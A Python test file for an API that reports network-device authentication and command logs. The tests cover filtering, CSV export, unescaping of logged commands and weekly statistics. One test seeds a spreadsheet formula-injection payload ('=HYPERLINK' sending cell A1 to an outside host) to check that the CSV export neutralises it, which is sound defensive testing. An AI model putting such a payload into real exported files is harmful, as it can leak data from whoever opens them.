from datetime import UTC, datetime, timedelta

from app.models import CmdAcct, RadAcct, RadPostAuth


def _seed_authn(db):
    now = datetime(2026, 9, 3, 18, 0, 0)
    db.add_all([
        RadPostAuth(username="everton", pass_="", reply="Access-Accept", authdate=now,
                    protocol="radius", nasipaddress="10.0.0.1",
                    callingstationid="192.0.2.10", serveripaddress="10.0.0.254"),
        RadPostAuth(username="everton", pass_="", reply="Access-Reject",
                    authdate=now - timedelta(hours=1), protocol="radius",
                    nasipaddress="10.0.0.1", callingstationid="192.0.2.10",
                    serveripaddress="10.0.0.254"),
        RadPostAuth(username="joao", pass_="", reply="Access-Accept",
                    authdate=now - timedelta(days=2), protocol="radius"),
        RadPostAuth(username="tacuser", pass_="", reply="Access-Accept",
                    authdate=now - timedelta(minutes=5), protocol="tacacs",
                    nasipaddress="10.0.0.2"),
    ])
    db.commit()


def _seed_cmds(db):
    now = datetime(2026, 9, 3, 18, 0, 0)
    db.add_all([
        CmdAcct(event_time=now, nasipaddress="10.0.0.9", username="everton",
                callingstationid="192.0.2.5", action="exec",
                command="show running-config", acctsessionid="s1"),
        CmdAcct(event_time=now - timedelta(hours=2), nasipaddress="10.0.0.10",
                username="joao", callingstationid="192.0.2.6", action="config",
                # como o rlm_sql grava: chars fora de safe_characters viram =XX
                command="snmp-server community =27public=27 =3B show ip route",
                acctsessionid="s2"),
    ])
    db.commit()


def test_authentication_list_and_filter(auth_client, seeded):
    _seed_authn(seeded)
    r = auth_client.get("/api/accounting/authentication")
    assert r.status_code == 200
    assert r.json()["total"] == 4
    top = r.json()["items"][0]  # mais recente = everton Access-Accept
    assert top["source_ip"] == "192.0.2.10"  # IP do técnico (Calling-Station-Id)
    assert top["dest_ip"] == "10.0.0.1"  # equipamento acessado
    assert top["protocol"] == "radius"

    r = auth_client.get("/api/accounting/authentication", params={"accepted": "false"})
    assert [i["username"] for i in r.json()["items"]] == ["everton"]

    r = auth_client.get("/api/accounting/authentication", params={"username": "joa"})
    assert r.json()["total"] == 1
    # data serializada com offset UTC explícito
    assert r.json()["items"][0]["authdate"].endswith("+00:00")

    r = auth_client.get("/api/accounting/authentication", params={"protocol": "tacacs"})
    assert r.json()["total"] == 1
    assert r.json()["items"][0]["username"] == "tacuser"
    assert r.json()["items"][0]["dest_ip"] == "10.0.0.2"  # equipamento
    assert r.json()["items"][0]["source_ip"] is None  # sem rem-addr conhecido


def test_authentication_alias_still_works(auth_client, seeded):
    _seed_authn(seeded)
    assert auth_client.get("/api/accounting/auth-events").json()["total"] == 4


def test_authentication_csv(auth_client, seeded):
    _seed_authn(seeded)
    r = auth_client.get("/api/accounting/authentication.csv")
    assert r.status_code == 200
    assert "authdate_utc,protocol,username,source_ip,dest_ip,reply" in r.text
    assert "Access-Reject" in r.text
    assert "tacacs" in r.text


def test_commands_list_filter_and_unescape(auth_client, seeded):
    _seed_cmds(seeded)
    r = auth_client.get("/api/accounting/commands")
    assert r.status_code == 200
    items = r.json()["items"]
    assert items[0]["command"] == "show running-config"
    # a rota reverte o escape =XX do rlm_sql
    assert items[1]["command"] == "snmp-server community 'public' ; show ip route"
    assert items[0]["event_time"].endswith("+00:00")

    r = auth_client.get("/api/accounting/commands", params={"nas_ip": "10.0.0.10"})
    assert r.json()["total"] == 1
    assert r.json()["items"][0]["username"] == "joao"

    r = auth_client.get("/api/accounting/commands", params={"action": "exec"})
    assert r.json()["total"] == 1


def test_commands_csv_unescaped(auth_client, seeded):
    _seed_cmds(seeded)
    r = auth_client.get("/api/accounting/commands.csv")
    assert "snmp-server community 'public' ; show ip route" in r.text


def test_reports_require_auth(client):
    assert client.get("/api/accounting/commands").status_code == 401


def test_stats_covers_one_week_with_daily_series(auth_client, seeded):
    now = datetime.now(UTC).replace(tzinfo=None)
    seeded.add_all([
        RadPostAuth(username="a", pass_="", reply="Access-Accept", authdate=now),
        RadPostAuth(username="b", pass_="", reply="Access-Accept",
                    authdate=now - timedelta(days=3)),
        RadPostAuth(username="c", pass_="", reply="Access-Reject",
                    authdate=now - timedelta(days=3)),
        # fora da janela de 7 dias: não deve contar
        RadPostAuth(username="d", pass_="", reply="Access-Accept",
                    authdate=now - timedelta(days=9)),
        RadAcct(radacctid=1, username="a", nasipaddress="10.0.0.1", acctsessionid="x1",
                acctstarttime=now - timedelta(days=1), acctstoptime=None),
    ])
    seeded.commit()

    s = auth_client.get("/api/accounting/stats").json()
    assert s["accepts_7d"] == 2
    assert s["rejects_7d"] == 1
    assert s["active_sessions"] == 1
    assert s["sessions_7d"] == 1
    assert len(s["daily"]) == 7
    assert s["daily"][-1]["accepts"] == 1  # hoje
    assert sum(p["accepts"] for p in s["daily"]) == 2
    assert sum(p["rejects"] for p in s["daily"]) == 1
    assert [p["username"] for p in s["top_users_7d"]] == ["a"]


def test_commands_csv_neutralizes_formulas(auth_client, seeded):
    seeded.add(CmdAcct(event_time=datetime(2026, 9, 3, 18, 0, 0), nasipaddress="10.0.0.9",
                       username="=cmd", callingstationid="", action="exec",
                       command='=HYPERLINK("http://x/?"&A1)', acctsessionid="s9"))
    seeded.commit()
    r = auth_client.get("/api/accounting/commands.csv")
    assert "'=HYPERLINK" in r.text and "'=cmd" in r.text


def test_stats_daily_buckets_follow_operator_timezone(auth_client, seeded):
    from zoneinfo import ZoneInfo

    # 23:30 de ontem em São Paulo = 02:30 UTC de hoje: tem que cair em "ontem"
    sp = ZoneInfo("America/Sao_Paulo")
    yesterday = datetime.now(sp).date() - timedelta(days=1)
    late = datetime(yesterday.year, yesterday.month, yesterday.day, 23, 30, tzinfo=sp)
    seeded.add(RadPostAuth(username="a", pass_="", reply="Access-Accept",
                           authdate=late.astimezone(UTC).replace(tzinfo=None)))
    seeded.commit()
    daily = auth_client.get("/api/accounting/stats").json()["daily"]
    assert daily[-2]["date"] == yesterday.isoformat()
    assert daily[-2]["accepts"] == 1 and daily[-1]["accepts"] == 0
